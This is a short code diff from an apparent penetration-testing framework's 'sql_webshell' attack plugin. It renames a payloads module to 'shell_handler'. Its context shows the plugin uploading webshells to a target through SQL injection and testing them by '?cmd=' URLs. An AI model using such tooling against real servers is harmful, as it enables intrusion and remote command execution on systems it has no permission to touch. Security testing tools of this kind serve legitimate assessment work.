@@ -37,7 +37,7 @@ import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
 from core.data.kb.shell import shell as shell
 
-import plugins.attack.payloads.payloads as payloads
+import plugins.attack.payloads.shell_handler as shell_handler
 
 # options
 from core.data.options.option import option
@@ -223,7 +223,7 @@ class sql_webshell(baseAttackPlugin):
             if webshell_url:
                 # Define the corresponding cut...
                 response = self._urlOpener.GET( webshell_url )
-                self._defineCut( response.getBody(), payloads.SHELL_IDENTIFIER , exact=True )
+                self._defineCut( response.getBody(), shell_handler.SHELL_IDENTIFIER , exact=True )
                 
                 # Create the shell object
                 # Set shell parameters
@@ -290,7 +290,7 @@ class sql_webshell(baseAttackPlugin):
             # Get the extension from the vulnerable script
             extension = urlParser.getExtension( vuln_obj.getURL() )
             
-            for file_content, real_extension in payloads.get_webshells( extension ):
+            for file_content, real_extension in shell_handler.get_webshells( extension ):
                 
                 # Create the variables to upload the file, based on the success of the
                 # previous for loop:
@@ -303,7 +303,7 @@ class sql_webshell(baseAttackPlugin):
                 test_url += '/' + filename + '.' + real_extension + '?cmd='
                 
                 # Upload & test
-                if self._upload_file( driver, remote_path, file_content, test_url, payloads.SHELL_IDENTIFIER):
+                if self._upload_file( driver, remote_path, file_content, test_url, shell_handler.SHELL_IDENTIFIER):
                     # Complete success!
                     om.out.console('Successfully installed a webshell in the target server!')
                     return test_url
